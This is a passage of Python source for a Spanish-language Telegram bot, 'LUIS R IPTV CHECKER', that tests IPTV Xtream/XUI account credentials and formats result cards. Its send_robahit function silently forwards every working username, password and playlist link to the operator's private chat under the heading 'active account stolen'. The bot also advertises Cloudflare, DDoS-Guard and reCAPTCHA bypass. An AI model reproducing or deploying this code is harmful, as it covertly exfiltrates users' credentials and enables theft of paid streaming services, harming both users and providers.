        "sc":   f"{base}/player_api.php?username={user}&password={pwd}&action=get_series_categories",
    }
    results = {}
    futs = {
        _EXECUTOR.submit(_count_json_objects, urls["live"], 12): "live",
        _EXECUTOR.submit(_count_json_objects, urls["vod"],  12): "vod",
        _EXECUTOR.submit(_count_json_objects, urls["ser"],  12): "ser",
    }
    deadline = time.time() + 18
    for fut in as_completed(futs, timeout=max(0, deadline - time.time())):
        try:
            results[futs[fut]] = fut.result() or ""
        except Exception:
            pass
    cat_futs = {}
    if not results.get("vod"):
        cat_futs[_EXECUTOR.submit(_count_list, urls["vc"], 6)] = "vod"
    if not results.get("ser"):
        cat_futs[_EXECUTOR.submit(_count_list, urls["sc"], 6)] = "ser"
    if cat_futs:
        for fut in as_completed(cat_futs, timeout=8):
            try:
                key = cat_futs[fut]
                results[key] = results.get(key) or fut.result() or ""
            except Exception:
                pass
    live  = results.get("live") or "N/D"
    vod   = results.get("vod")  or "N/D"
    serie = results.get("ser")  or "N/D"
    return live, vod, serie

def get_categories(portal: str, user: str, pwd: str, limit: int = 20) -> str:
    try:
        ua = _next_ua()
        base = f"http://{portal}"
        r = requests.get(
            f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
            headers={"User-Agent": ua}, timeout=(CONN_TIMEOUT, 10), verify=False)
        if r.status_code != 200:
            return ""
        cats = r.json()
        if not isinstance(cats, list) or not cats:
            return ""
        count_map: dict = {}
        try:
            resp = requests.get(
                f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
                headers={"User-Agent": ua}, timeout=(CONN_TIMEOUT, 15),
                verify=False, stream=True)
            if resp.status_code == 200:
                raw_chunks = []
                read = 0
                for chunk in resp.iter_content(65536):
                    raw_chunks.append(chunk)
                    read += len(chunk)
                    if read >= 8 * 1024 * 1024:
                        break
                resp.close()
                for ch in json.loads(b"".join(raw_chunks).decode("utf-8", errors="ignore")):
                    cid = str(ch.get("category_id",""))
                    count_map[cid] = count_map.get(cid, 0) + 1
        except Exception:
            pass
        lines = []
        for c in cats[:limit]:
            name = c.get("category_name","").replace("\\/","/").strip()
            cid  = str(c.get("category_id",""))
            if not name:
                continue
            cnt = f" [{count_map[cid]}]" if cid in count_map else ""
            lines.append(f"   {ARROW} {name}{cnt}")
        if len(cats) > limit:
            lines.append(f"   ➕ ...y {len(cats)-limit} categorías más")
        return "\n".join(lines)
    except Exception:
        return ""

def get_location(portal: str) -> str:
    try:
        ip = portal.split(":")[0]
        r  = requests.get(f"http://ip-api.com/json/{ip}", timeout=4, verify=False)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                code = d.get("countryCode","")
                return f"{d.get('country','?')} {flag_from_code(code)}"
    except Exception:
        pass
    return f"Desconocido {GLOBE}"

# ╔══════════════════════════════════════════════════════════╗
# ║              🔔 ROBAHITS — Envío automático              ║
# ╚══════════════════════════════════════════════════════════╝

def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
    if not BOT_TOKEN or not ROBAHITS_CHATID:
        return
    try:
        expire = ts_to_date(ui.get("exp_date", 0))
        m3u    = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        text = (
            f"╔{'═'*30}╗\n"
            f"║  {SKULL} <b>ROBO HIT — LUIS R</b> {SKULL}  ║\n"
            f"╚{'═'*30}╝\n\n"
            f"{FIRE} <b>¡CUENTA ACTIVA ROBADA!</b> {FIRE}\n\n"
            f"{ARROW} {GLOBE} <b>Portal:</b> <code>{portal}</code>\n"
            f"{ARROW} 👤 <b>Usuario:</b> <code>{user}</code>\n"
            f"{ARROW} {KEY} <b>Pass:</b> <code>{pwd}</code>\n"
            f"{ARROW} {CALENDAR} <b>Vence:</b> {expire}\n\n"
            f"{LIVE} En vivo: <b>{live}</b>  {MOVIE} VOD: <b>{vod}</b>  {SERIES} Series: <b>{series}</b>\n\n"
            f"{ARROW} 🔗 <a href=\"{m3u}\">📥 Descargar M3U</a>\n\n"
            f"👤 Verificado por: @{from_user}\n"
            f"{CLOCK} {now_str()}\n"
            f"{SKULL} {BOT_USERNAME}"
        )
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": ROBAHITS_CHATID, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
    except Exception as e:
        log.warning(f"RobaHit err: {e}")

# ╔══════════════════════════════════════════════════════════╗
# ║            🃏 TARJETAS DE RESULTADO — NIVEL DIOS         ║
# ╚══════════════════════════════════════════════════════════╝

def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
    expire   = ts_to_date(ui.get("exp_date", 0))
    created  = ts_to_date(ui.get("created_at", 0))
    active   = ui.get("active_cons", "?")
    maxcon   = ui.get("max_connections", "?")
    status   = ui.get("status", "Active")
    trial    = f"❌ No" if str(ui.get("is_trial","0")) in ("0","false","") else f"✅ Activo"
    location = get_location(portal)
    m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"

    t  = f"{LINE_THICK}\n"
    t += f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
    t += f"  {DIAMOND} <b>ᴄᴜᴇɴᴛᴀ ɪᴘᴛᴠ ᴠᴇʀɪꜰɪᴄᴀᴅᴀ</b> {DIAMOND}\n"
    t += f"{LINE_THICK}\n\n"

    t += f"  {FIRE} <b>ESTADO:</b> 🟢 <b>ACTIVA — {status.upper()}</b> {FIRE}\n\n"

    t += f"{LINE_THIN}\n"
    t += f"  {GLOBE} <b>ACCESO</b>\n"
    t += f"{LINE_THIN}\n"
    t += f"  {ARROW} 🌐 Portal: <code>{portal}</code>\n"
    t += f"  {ARROW} 👤 Usuario: <code>{user}</code>\n"
    t += f"  {ARROW} {KEY} Pass: <code>{pwd}</code>\n"
    t += f"  {ARROW} 🧪 Trial: {trial}\n\n"

    t += f"{LINE_THIN}\n"
    t += f"  {CALENDAR} <b>TIEMPO</b>\n"
    t += f"{LINE_THIN}\n"
    t += f"  {ARROW} 📅 Creada: {created}\n"
    t += f"  {ARROW} ⏳ Vence: <b>{expire}</b>\n"
    t += f"  {ARROW} 🔁 Conexiones: {active} / {maxcon}\n"
    t += f"  {ARROW} 📍 País: {location}\n\n"

    t += f"{LINE_THIN}\n"
    t += f"  {LIVE} <b>CONTENIDO</b>\n"
    t += f"{LINE_THIN}\n"
    t += f"  {ARROW} 📺 En Vivo: <b>{live}</b> canales\n"
    t += f"  {ARROW} 🎬 VOD: <b>{vod}</b> películas\n"
    t += f"  {ARROW} 🎭 Series: <b>{series}</b> series\n\n"

    t += f"{LINE_THIN}\n"
    t += f"  🔗 <b>LINKS</b>\n"
    t += f"{LINE_THIN}\n"
    t += f'  {ARROW} <a href="{m3u}">📥 M3U Plus Link</a>\n'
    t += f'  {ARROW} <a href="{epg}">📋 EPG / Guía</a>\n\n'

    if cats:
        t += f"{LINE_THIN}\n"
        t += f"  📡 <b>CATEGORÍAS EN VIVO</b>\n"
        t += f"{LINE_THIN}\n"
        t += f"{cats}\n\n"

    t += f"{LINE_THIN}\n"
    t += f"  {CHECK} Verificado para @{tg_user}\n"
    t += f"  {CLOCK} {now_str()}\n"
    t += f"  {SKULL} {BOT_USERNAME}\n"
    t += f"{LINE_THICK}"
    return t

def card_custom(portal, user, pwd, ui, tg_user) -> str:
    t  = f"{LINE_THICK}\n"
    t += f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
    t += f"  {WARN} <b>ᴄᴜᴇɴᴛᴀ ɴᴏ ᴀᴄᴛɪᴠᴀ</b> {WARN}\n"
    t += f"{LINE_THICK}\n\n"
    t += f"  🟡 <b>EXISTE pero NO ESTÁ ACTIVA</b>\n\n"
    t += f"{LINE_THIN}\n"
    t += f"  {ARROW} 🌐 Portal: <code>{portal}</code>\n"
    t += f"  {ARROW} 👤 Usuario: <code>{user}</code>\n"
    t += f"  {ARROW} {KEY} Pass: <code>{pwd}</code>\n"
    t += f"  {ARROW} 🆙 Estado: ⚠️ {ui.get('status','?').upper()}\n"
    t += f"  {ARROW} ⏳ Vence: {ts_to_date(ui.get('exp_date',0))}\n"
    t += f"  {ARROW} 🔁 Máx conexiones: {ui.get('max_connections','?')}\n\n"
    t += f"{LINE_THIN}\n"
    t += f"  {CHECK} Verificado para @{tg_user}\n"
    t += f"  {CLOCK} {now_str()}\n"
    t += f"  {SKULL} {BOT_USERNAME}\n"
    t += f"{LINE_THICK}"
    return t

def card_fail(portal, user, tg_user) -> str:
    t  = f"{LINE_THICK}\n"
    t += f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
    t += f"  {CROSS} <b>ᴄᴜᴇɴᴛᴀ ɪɴᴠᴀ́ʟɪᴅᴀ</b> {CROSS}\n"
    t += f"{LINE_THICK}\n\n"
    t += f"  🔴 <b>CREDENCIALES INCORRECTAS</b>\n\n"
    t += f"{LINE_THIN}\n"
    t += f"  {ARROW} 🌐 Portal: <code>{portal}</code>\n"
    t += f"  {ARROW} 👤 Usuario: <code>{user}</code>\n"
    t += f"  {CROSS} Esta cuenta no existe o expiró\n\n"
    t += f"{LINE_THIN}\n"
    t += f"  {CHECK} Verificado para @{tg_user}\n"
    t += f"  {CLOCK} {now_str()}\n"
    t += f"  {SKULL} {BOT_USERNAME}\n"
    t += f"{LINE_THICK}"
    return t

def card_retry(portal, user, tg_user, detail=None) -> str:
    # Detectar tipo de error real para mostrarlo
    error_info = ""
    tip = ""
    if detail and isinstance(detail, str):
        d = detail.lower()
        if "timeout" in d or "readtimeout" in d or "connecttimeout" in d:
            error_info = "⏱ <b>Timeout</b> — el servidor tardó más de 15s en responder"
            tip = "El servidor existe pero está lento. Intenta de nuevo en unos minutos."
        elif "403" in d or "forbidden" in d:
            error_info = "🚫 <b>HTTP 403 Forbidden</b> — acceso bloqueado por el servidor"
            tip = "El servidor bloqueó la IP del bot. Usa /debug para más info."
        elif "ssl" in d or "certificate" in d:
            error_info = "🔒 <b>SSL Error</b> — problema con el certificado del servidor"
            tip = "El servidor tiene SSL mal configurado. Prueba con http:// en lugar de https://"
        elif "connectionerror" in d or "connection" in d:
            error_info = "📵 <b>Connection Error</b> — no se pudo conectar al servidor"
            tip = "El servidor puede estar caído o la IP bloqueada por CF."
        elif "cloudflare" in d or "cf" in d:
            error_info = "☁️ <b>Cloudflare</b> — el servidor está protegido con CF"
            tip = "Se intentaron 6 técnicas de bypass. Usa /debug para diagnóstico completo."
        else:
            error_info = f"⚠️ <b>Error:</b> {str(detail)[:80]}"
            tip = "Usa /debug para diagnóstico detallado."
    else:
        error_info = "🟠 <b>Sin respuesta JSON válida</b> — el servidor no respondió como API IPTV"
        tip = "Puede ser XUI, panel no estándar, o servidor con CF. Pega la URL completa."

    t  = f"{LINE_THICK}\n"
    t += f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
    t += f"  ⏳ <b>ꜱɪɴ ʀᴇꜱᴘᴜᴇꜱᴛᴀ ᴠᴀ́ʟɪᴅᴀ</b> ⏳\n"
    t += f"{LINE_THICK}\n\n"
    t += f"  {error_info}\n\n"
    t += f"{LINE_THIN}\n"
    t += f"  {ARROW} 🌐 Portal: <code>{portal}</code>\n"
    t += f"  {ARROW} 👤 Usuario: <code>{user}</code>\n\n"
    t += f"  💡 {tip}\n"
    t += f"  🔁 Usa /debug para ver status code real\n\n"
    t += f"{LINE_THIN}\n"
    t += f"  {CHECK} Verificado para @{tg_user}\n"
    t += f"  {CLOCK} {now_str()}\n"
    t += f"  {SKULL} {BOT_USERNAME}\n"
    t += f"{LINE_THICK}"
    return t

# ╔══════════════════════════════════════════════════════════╗
# ║                🔄 KEEP-ALIVE 24/7                        ║
# ╚══════════════════════════════════════════════════════════╝

def keep_alive():
    if not RENDER_URL:
        return
    while True:
        try:
            requests.get(RENDER_URL, timeout=8)
        except Exception:
            pass
        time.sleep(480)

# ╔══════════════════════════════════════════════════════════╗
# ║                  🛠️ HELPERS                              ║
# ╚══════════════════════════════════════════════════════════╝

def is_admin(u: Update) -> bool:
    return u.effective_user.id == ADMIN_ID

def tg_name(u: Update) -> str:
    usr = u.effective_user
    return usr.username or usr.first_name or str(usr.id)

# ╔══════════════════════════════════════════════════════════╗
# ║                ⚡ LÓGICA CENTRAL                          ║
# ╚══════════════════════════════════════════════════════════╝

async def do_check(update: Update, portal: str, user: str, pwd: str, is_xui: bool = False):
    if not bot_active:
        await update.message.reply_text(
            f"{SKULL} Bot en pausa.\n Solo el admin puede reactivarlo.\n{SKULL} {BOT_USERNAME}")
        return

    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    tg_user = tg_name(update)

    msg  = await update.message.reply_text(
        f"{ROCKET} <b>Verificando cuenta...</b>\n"
        f"{SIGNAL} Conectando al servidor {GLOBE}\n"
        f"<i>Por favor espera ~5 segundos...</i>",
        parse_mode=ParseMode.HTML)
    loop = asyncio.get_event_loop()

    status, result = await loop.run_in_executor(
        _EXECUTOR, verify_account, portal, user, pwd, is_xui)

    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text(
            f"{FIRE} <b>¡CUENTA ACTIVA ENCONTRADA!</b>\n"
            f"{SIGNAL} Obteniendo contenido y estadísticas...",
            parse_mode=ParseMode.HTML)
        ui = result["user_info"]
        live_f = loop.run_in_executor(_EXECUTOR, get_content_counts, portal, user, pwd)
        cats_f = loop.run_in_executor(_EXECUTOR, get_categories, portal, user, pwd)
        live, vod, series = await live_f
        cats              = await cats_f
        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        threading.Thread(
            target=send_robahit,
            args=(portal, user, pwd, ui, live, vod, series, tg_user),
            daemon=True
        ).start()

    elif status == "CUSTOM":
        STATS["hits"] += 1
        ui = result["user_info"]
        await msg.edit_text(card_custom(portal, user, pwd, ui, tg_user),
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal, user, tg_user), parse_mode=ParseMode.HTML)

    else:
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal, user, tg_user, result), parse_mode=ParseMode.HTML)

# ╔══════════════════════════════════════════════════════════╗
# ║                  📟 COMANDOS                             ║
# ╚══════════════════════════════════════════════════════════╝

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STATS["users"].add(update.effective_user.id)
    admin_extra = ""
    if is_admin(update):
        global bot_active
        bot_active = True
        admin_extra = f"\n{CROWN} <b>Modo Admin activado</b> {CROWN}"

    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📖 Cómo usar",  callback_data="help"),
            InlineKeyboardButton("📊 Estado",     callback_data="status"),
        ],
        [
            InlineKeyboardButton("🔥 Formatos soportados", callback_data="formats"),
        ]
    ])

    await update.message.reply_text(
        f"╔{'═'*28}╗\n"
        f"║  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}  ║\n"
        f"║  <b>IPTV CHECKER v5.0 GODMODE</b>  ║\n"
        f"╚{'═'*28}╝\n\n"
        f"{FIRE} <b>¡Bienvenido!</b> El checker más potente {FIRE}\n\n"
        f"{BOLT} Verificación ultra-rápida ~5s\n"
        f"{SHIELD} Bypass CF / DDoS-Guard / reCAPTCHA\n"
        f"{SIGNAL} Soporte XUI One + Xtream + M3U\n"
        f"{ROCKET} Paralelo — max 25s por cuenta\n"
        f"{FIRE} RobaHits automático al admin\n"
        f"{DIAMOND} 24/7 activo sin interrupciones\n"
        f"{admin_extra}\n"
        f"{LINE_THIN}\n"
        f"📌 <b>Pega tu URL directamente aquí</b>\n"
        f"<code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
        f"{LINE_THIN}\n"
        f"{SKULL} {BOT_USERNAME}",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(
            f"{CROSS} <b>Acceso denegado.</b>\nSolo el administrador puede hacer esto.",
            parse_mode=ParseMode.HTML)
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(
        f"{LINE_THICK}\n"
        f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
        f"{LINE_THICK}\n\n"
        f"  🔴 <b>BOT DETENIDO</b>\n\n"
        f"  {CLOCK} {now_str()}\n"
        f"  Usa /start para reactivar\n\n"
        f"  {SKULL} {BOT_USERNAME}\n"
        f"{LINE_THICK}",
        parse_mode=ParseMode.HTML)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(
            f"{CROSS} <b>Acceso denegado.</b>",
            parse_mode=ParseMode.HTML)
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m, s   = divmod(rem, 60)
    estado = f"🟢 <b>ACTIVO</b>" if bot_active else "🔴 <b>DETENIDO</b>"
    try:
        import cloudscraper
        cf_st = f"{CHECK} Instalado"
    except ImportError:
        cf_st = f"{WARN} No instalado (pip install cloudscraper)"

    total = STATS['checks'] or 1
    hit_pct = round(STATS['hits'] * 100 / total, 1)

    await update.message.reply_text(
        f"{LINE_THICK}\n"
        f"  {SKULL} <b>🦂LUIS R🦂</b> — ESTADO {SKULL}\n"
        f"{LINE_THICK}\n\n"
        f"  {BOLT} Bot: {estado}\n"
        f"  ⏰ Uptime: <b>{h:02d}h {m:02d}m {s:02d}s</b>\n"
        f"  {CLOCK} Hora: {now_str()}\n"
        f"  {GLOBE} Zona: {TZ_NAME}\n\n"
        f"{LINE_THIN}\n"
        f"  {TROPHY} <b>ESTADÍSTICAS</b>\n"
        f"{LINE_THIN}\n"
        f"  {CHECK} Hits: <b>{STATS['hits']}</b>\n"
        f"  {CROSS} Fails: <b>{STATS['fails']}</b>\n"
        f"  🔄 Retries: <b>{STATS['retries']}</b>\n"
        f"  {STAR} Total checks: <b>{STATS['checks']}</b>\n"
        f"  {FIRE} Tasa éxito: <b>{hit_pct}%</b>\n"
        f"  👥 Usuarios: <b>{len(STATS['users'])}</b>\n\n"
        f"{LINE_THIN}\n"
        f"  {SHIELD} <b>SISTEMA</b>\n"
        f"{LINE_THIN}\n"
        f"  {SHIELD} Cloudscraper: {cf_st}\n"
        f"  🔔 RobaHits → <code>{ROBAHITS_CHATID}</code>\n"
        f"  📋 Dominios CF: {len(CF_DOMAINS)}\n"
        f"  🤖 Threads: {threading.active_count()}\n\n"
        f"  {SKULL} {BOT_USERNAME}\n"
        f"{LINE_THICK}",
        parse_mode=ParseMode.HTML)

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"{LINE_THICK}\n"
            f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
            f"{LINE_THICK}\n\n"
            f"  📌 <b>USO DEL COMANDO /check</b>\n\n"
            f"  <code>/check portal:puerto usuario pass</code>\n\n"
            f"  {FIRE} <b>Ejemplo:</b>\n"
            f"  <code>/check etvhosts.site:55337 MiUser MiPass</code>\n\n"
            f"  {SKULL} {BOT_USERNAME}\n"
            f"{LINE_THICK}",
            parse_mode=ParseMode.HTML)
        return
    await do_check(update, args[0], args[1], args[2])

async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(
            f"{CROSS} <b>Acceso denegado.</b>",
            parse_mode=ParseMode.HTML)
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"📌 <code>/debug portal:puerto usuario contraseña</code>",
            parse_mode=ParseMode.HTML)
        return
    portal, user, pwd = args[0], args[1], args[2]
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080
    msg  = await update.message.reply_text(
        f"{GEM} <b>Ejecutando diagnóstico completo...</b>",
        parse_mode=ParseMode.HTML)
    primary, alt = _schemes_for_portal(portal)
    lines = [
        f"🔬 <b>DIAGNÓSTICO</b> — {SKULL} 🦂LUIS R🦂\n",
        f"🌐 Portal: <code>{portal}</code>",
        f"{SHIELD} CF: {'✅ Sí' if _is_cf(host) else '❌ No'}",
        f"🔌 Protocolo: {primary.upper()} (alt: {alt.upper()})",
    ]
    for p in (port, 80, 443):
        try:
            conn = socket.create_connection((host, p), timeout=3)
            conn.close()
            lines.append(f"🔌 TCP ✅ puerto {p}")
            break
        except Exception as e:
            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:40]}")
    lines.append("")
    for scheme in (primary, alt):
        for ep in ("player_api.php", "get.php"):
            if ep == "player_api.php":
                url = f"{scheme}://{portal}/{ep}?username={user}&password={pwd}"
            else:
                url = f"{scheme}://{portal}/{ep}?username={user}&password={pwd}&type=m3u_plus"
            lines.append(f"🔗 <code>{scheme.upper()} {ep}</code>")
            try:
                r = requests.get(url, headers={"User-Agent": ALL_USER_AGENTS[0]},
                                 timeout=(4, 10), verify=False)
                raw = r.text.strip()[:300].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
                lines.append(f"  HTTP {r.status_code} | CT: {r.headers.get('Content-Type','?')[:30]}")
                lines.append(f"  <code>{raw}</code>")
            except requests.exceptions.Timeout:
                lines.append("  ⏱ Timeout")
            except Exception as e:
                lines.append(f"  {CROSS} {str(e)[:60]}")
            lines.append("")
    xui_url = f"{primary}://{portal}/playlist/{user}/{pwd}/m3u_plus"
    lines.append(f"🔗 <code>XUI One playlist</code>")
    try:
        r = requests.get(xui_url, headers={"User-Agent": ALL_USER_AGENTS[0]},
                         timeout=(4, 10), verify=False)
        raw = r.text.strip()[:200].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
        lines.append(f"  HTTP {r.status_code}")
        lines.append(f"  <code>{raw}</code>")
    except Exception as e:
        lines.append(f"  {CROSS} {str(e)[:60]}")

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:4000] + "\n…(truncado)"
    await msg.edit_text(text, parse_mode=ParseMode.HTML)

async def cmd_addcf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(
            f"{CROSS} <b>Acceso denegado.</b>",
            parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        domains = "\n".join(f"   {ARROW} {d}" for d in CF_DOMAINS)
        await update.message.reply_text(
            f"{LINE_THICK}\n"
            f"  {SHIELD} <b>DOMINIOS CLOUDFLARE</b> ({len(CF_DOMAINS)})\n"
            f"{LINE_THICK}\n\n"
            f"{domains}\n\n"
            f"📌 Agregar: <code>/addcf dominio.com</code>\n\n"
            f"  {SKULL} {BOT_USERNAME}\n"
            f"{LINE_THICK}",
            parse_mode=ParseMode.HTML)
        return
    domain = args[0].lower().strip()
    if domain not in CF_DOMAINS:
        CF_DOMAINS.append(domain)
        await update.message.reply_text(
            f"{CHECK} <code>{domain}</code> agregado a lista CF.\n{SKULL} {BOT_USERNAME}",
            parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(
            f"{WARN} <code>{domain}</code> ya estaba en la lista.",
            parse_mode=ParseMode.HTML)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_cmds = ""
    if is_admin(update):
        admin_cmds = (
            f"\n{LINE_THIN}\n"
            f"  {CROWN} <b>PANEL DE ADMIN</b> {CROWN}\n"
            f"{LINE_THIN}\n"
            f"  /stop — 🔴 Pausar bot\n"
            f"  /start — 🟢 Reactivar bot\n"
            f"  /status — 📊 Ver estadísticas\n"
            f"  /debug portal user pass — 🔬 Diagnóstico\n"
            f"  /addcf dominio — {SHIELD} Agregar a lista CF\n"
        )
    await update.message.reply_text(
        f"{LINE_THICK}\n"
        f"  {SKULL} <b>🦂LUIS R🦂</b> — AYUDA {SKULL}\n"
        f"{LINE_THICK}\n\n"
        f"{LINE_THIN}\n"
        f"  📌 <b>COMANDOS</b>\n"
        f"{LINE_THIN}\n"
        f"  /start — 🟢 Pantalla principal\n"
        f"  /check portal user pass — {CHECK} Verificar\n"
        f"  /help — ❓ Esta ayuda\n"
        f"{admin_cmds}\n"
        f"{LINE_THIN}\n"
        f"  {BOLT} <b>FORMATOS SOPORTADOS</b>\n"
        f"{LINE_THIN}\n"
        f"• <code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
        f"• <code>http://portal/playlist/user/pass/m3u_plus</code> ← XUI One\n"
        f"• <code>portal|usuario|pass</code>\n"
        f"• <code>portal usuario pass</code>\n\n"
        f"  {SKULL} {BOT_USERNAME}\n"
        f"{LINE_THICK}",
        parse_mode=ParseMode.HTML)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "help":
        await query.message.reply_text(
            f"{LINE_THICK}\n"
            f"  {SKULL} <b>🦂LUIS R🦂</b> — CÓMO USAR {SKULL}\n"
            f"{LINE_THICK}\n\n"
            f"  {BOLT} <b>MÉTODO 1 — Pega tu URL directamente:</b>\n"
            f"<code>http://portal/get.php?username=U&amp;password=P</code>\n\n"
            f"  {BOLT} <b>MÉTODO 2 — XUI One:</b>\n"
            f"<code>http://portal/playlist/user/pass/m3u_plus</code>\n\n"
            f"  {BOLT} <b>MÉTODO 3 — Separado por pipe:</b>\n"
            f"<code>portal|user|pass</code>\n\n"
            f"  {BOLT} <b>MÉTODO 4 — Comando manual:</b>\n"
            f"<code>/check portal:puerto usuario contraseña</code>\n\n"
            f"  {SKULL} {BOT_USERNAME}\n"
            f"{LINE_THICK}",
            parse_mode=ParseMode.HTML)

    elif query.data == "status":
        estado = f"🟢 <b>ACTIVO</b>" if bot_active else "🔴 <b>DETENIDO</b>"
        total = STATS['checks'] or 1
        hit_pct = round(STATS['hits'] * 100 / total, 1)
        await query.message.reply_text(
            f"{LINE_THICK}\n"
            f"  {SKULL} <b>🦂LUIS R🦂</b> — ESTADO {SKULL}\n"
            f"{LINE_THICK}\n\n"
            f"  {BOLT} Bot: {estado}\n"
            f"  {CHECK} Hits: <b>{STATS['hits']}</b>\n"
            f"  {CROSS} Fails: <b>{STATS['fails']}</b>\n"
            f"  {STAR} Total: <b>{STATS['checks']}</b>\n"
            f"  {FIRE} Éxito: <b>{hit_pct}%</b>\n"
            f"  👥 Usuarios: <b>{len(STATS['users'])}</b>\n"
            f"  {CLOCK} {now_str()}\n\n"
            f"  {SKULL} {BOT_USERNAME}\n"
            f"{LINE_THICK}",
            parse_mode=ParseMode.HTML)

    elif query.data == "formats":
        await query.message.reply_text(
            f"{LINE_THICK}\n"
            f"  {SKULL} <b>🦂LUIS R🦂</b> — FORMATOS {SKULL}\n"
            f"{LINE_THICK}\n\n"
            f"  {SIGNAL} <b>Xtream Codes estándar:</b>\n"
            f"<code>http://portal:8080/get.php?username=U&amp;password=P&amp;type=m3u_plus</code>\n\n"
            f"  {SIGNAL} <b>Player API:</b>\n"
            f"<code>http://portal:8080/player_api.php?username=U&amp;password=P</code>\n\n"
            f"  {SIGNAL} <b>XUI One Playlist:</b>\n"
            f"<code>http://portal/playlist/usuario/pass/m3u_plus</code>\n\n"
            f"  {SIGNAL} <b>Pipe separado:</b>\n"
            f"<code>portal:8080|usuario|contraseña</code>\n\n"
            f"  {SIGNAL} <b>Espacio separado:</b>\n"
            f"<code>portal:8080 usuario contraseña</code>\n\n"
            f"  {SKULL} {BOT_USERNAME}\n"
            f"{LINE_THICK}",
            parse_mode=ParseMode.HTML)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active:
        await update.message.reply_text(
            f"{LINE_THICK}\n"
            f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
            f"{LINE_THICK}\n\n"
            f"  🔴 <b>BOT EN PAUSA</b>\n"
            f"  El administrador lo ha detenido temporalmente.\n\n"
            f"  {SKULL} {BOT_USERNAME}\n"
            f"{LINE_THICK}",
            parse_mode=ParseMode.HTML)
        return
    text = (update.message.text or "").strip()
    portal, user, pwd, is_xui = extract_from_url(text)
    if portal and user and pwd:
        await do_check(update, portal, user, pwd, is_xui=is_xui)
    else:
        await update.message.reply_text(
            f"{LINE_THICK}\n"
            f"  {SKULL} <b>🦂LUIS R🦂</b> {SKULL}\n"
            f"{LINE_THICK}\n\n"
            f"  {WARN} <b>Formato no reconocido</b>\n\n"
            f"  📌 <b>Ejemplos válidos:</b>\n"
            f"  <code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
            f"  <code>http://portal/playlist/usuario/pass/m3u_plus</code>\n"
            f"  <code>portal|usuario|pass</code>\n\n"
            f"  Usa /help para ver todos los formatos.\n\n"
            f"  {SKULL} {BOT_USERNAME}\n"
            f"{LINE_THICK}",
            parse_mode=ParseMode.HTML)

# ╔══════════════════════════════════════════════════════════╗
# ║              🚀 MAIN — Loop robusto 24/7                 ║
# ╚══════════════════════════════════════════════════════════╝

def main():
    if not BOT_TOKEN:
        log.error("❌ BOT_TOKEN no configurado. Railway → Variables → BOT_TOKEN")
        return

    threading.Thread(target=keep_alive, daemon=True).start()
    log.info(f"🦂 BOT 🦂LUIS R🦂 v4.0 NIVEL DIOS | TZ: {TZ_NAME}")
    log.info(f"   UAs: {len(ALL_USER_AGENTS)} | CF dominios: {len(CF_DOMAINS)} | Threads: 20")
    log.info(f"   Timeouts: TCP={TCP_TIMEOUT}s CONN={CONN_TIMEOUT}s READ={READ_TIMEOUT}s TOTAL={TOTAL_TIMEOUT}s")

    RETRY_DELAYS = [5, 10, 15, 30, 60]
    attempt = 0

    while True:
        try:
            app = (
                Application.builder()
                .token(BOT_TOKEN)
                .concurrent_updates(True)
                .build()
            )
            app.add_handler(CommandHandler("start",  cmd_start))
